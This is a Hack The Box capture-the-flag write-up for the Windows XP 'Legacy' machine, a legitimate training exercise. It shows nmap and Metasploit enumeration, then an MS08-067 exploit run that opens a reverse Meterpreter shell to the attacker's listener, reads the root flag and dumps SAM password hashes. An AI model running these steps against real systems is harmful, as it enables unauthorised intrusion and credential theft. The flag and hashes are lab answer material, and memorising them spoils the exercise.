# Hack The Box Machine Writeup
**:beginner: Machine Name:** Legacy
**:rocket: Difficulty:**   Easy
**:computer: Machine IP:**  10.10.10.4
**:key: Access Mode:**  VPN


## :performing_arts:Enumeration

Conducted a comprehensive network scan using Nmap with the following flags:

- -A: Enabled OS detection, version detection, script scanning, and traceroute.

- -T4: Utilized an aggressive timing template to balance speed and detection.

- -p-: Scanned all 65,535 TCP ports to ensure complete enumeration.

Note on Real-World Applicability: This intrusive scanning method is appropriate for a controlled assessment but would require adjustment in a monitored production environment to avoid detection.

### :exclamation:Key Findings

Identified an SMB service with significant security misconfigurations:

- Guest authentication is enabled.

- SMB message signing is disabled.

These vulnerabilities were documented as potential attack vectors for the exploitation phase.

**Tool**: Nmap

<details>
  <summary>Nmap Scan Results</summary>
  
  ~~~bash
    Hackden> ~ sudo nmap -A -T4 -p- 10.10.10.4
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-15 23:05 PKT
    Nmap scan report for 10.10.10.4 (10.10.10.4)
    Host is up (0.47s latency).
    Not shown: 65532 filtered ports

    PORT     STATE  SERVICE       VERSION
    139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open   microsoft-ds  Windows XP microsoft-ds
    3389/tcp closed ms-wbt-server

    Device type: general purpose|specialized

    Running (JUST GUESSING): Microsoft Windows XP|2003|2000 (92%), General Dynamics embedded (89%)

    OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_2000::sp4
    Aggressive OS guesses: Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP Professional SP2 (90%), Microsoft Windows XP SP2 (90%), Microsoft Windows Server 2003 (89%), Microsoft Windows XP Professional SP3 (89%), Microsoft Windows XP SP2 or Windows Server 2003 (89%), General Dynamics R8000B Comm Systems Analyzer (89%)

    No exact OS matches for host (test conditions non-ideal).

    Network Distance: 2 hops

    Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

    Host script results:
    |_clock-skew: mean: -4h29m19s, deviation: 2h07m15s, median: -5h59m18s
    |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:09:a3 (VMware)
    | smb-os-discovery: 
    |   OS: Windows XP (Windows 2000 LAN Manager)
    |   OS CPE: cpe:/o:microsoft:windows_xp::-
    |   Computer name: legacy
    |   NetBIOS computer name: LEGACY\x00
    |   Workgroup: HTB\x00
    |_  System time: 2020-04-15T18:22:00+03:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smb2-time: Protocol negotiation failed (SMB2)

    TRACEROUTE (using port 3389/tcp)
    HOP RTT       ADDRESS
    1   226.12 ms 10.10.14.1 (10.10.14.1)
    2   542.77 ms 10.10.10.4 (10.10.10.4)

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 994.24 seconds
~~~

</details>

## :no_entry: Exploitation

As the SMB service was doscovered, we initiated the explotation with SMB Client tool to check if we are able to connect

**Tool:** smbclient

~~~bash
smbclient -L 10.10.10.4

Hackden> ~ smbclient -L 10.10.10.4
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
Hackden> ~ smbclient -L 10.10.10.4
protocol negotiation failed: NT_STATUS_IO_TIMEOUT
Hackden> ~ 
~~~

smbclient failed to connect so we move on to metasploit using a well known exploit

**Tool:** Metasploit

1. Enumerate using the scanner module
~~~bash
msf5 > use auxiliary/scanner/smb/smb_version 
msf5 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
~~~

This gives us the operatin gsystem and the workgroup name and confirms that SMB service is infact running. This information can be used for further exploitation. But it does not gives us the version so we can use operating system information to search for exploit online.

[SMB NetAPI Exploit on Rapid7](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi)

Target is to gain *NT AUTHORITY\SYSTEM* which is equivalent to root on linux

2. Using the exploit

~~~bash
msf5 > use exploit/windows/smb/ms08_067_netapi

msf5 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf5 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.56:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (180291 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.56:4444 -> 10.10.10.4:1030) at 2020-04-16 22:19:45 +0500

~~~

Using the exploit gave us a meterpreter session with the right privileges as can be seen below

~~~bash
meterpreter > dir
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2017-03-16 11:18:19 +0500  root.txt

meterpreter > cat root.txt
993442d258b0e0ec917cae9e695d5713meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > help

~~~

Using this authority we can use the hashdum command to dump the SAM Hashses and use them to exploit the system further but we already have the authority hence the machine is wxploited successfully

~~~bash
meterpreter > hashdump
Administrator:500:b47234f31e261b47587db580d0d5f393:b1e8bd81ee9a6679befb976c0b9b6827:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:0ca071c2a387b648559a926bfe39f8d7:332e3bd65dbe0af563383faff76c6dc5:::
john:1003:dc6e5a1d0d4929c2969213afe9351474:54ee9a60735ab539438797574a9487ad:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f2b8398cafc7174be746a74a3a7a3823:::
~~~

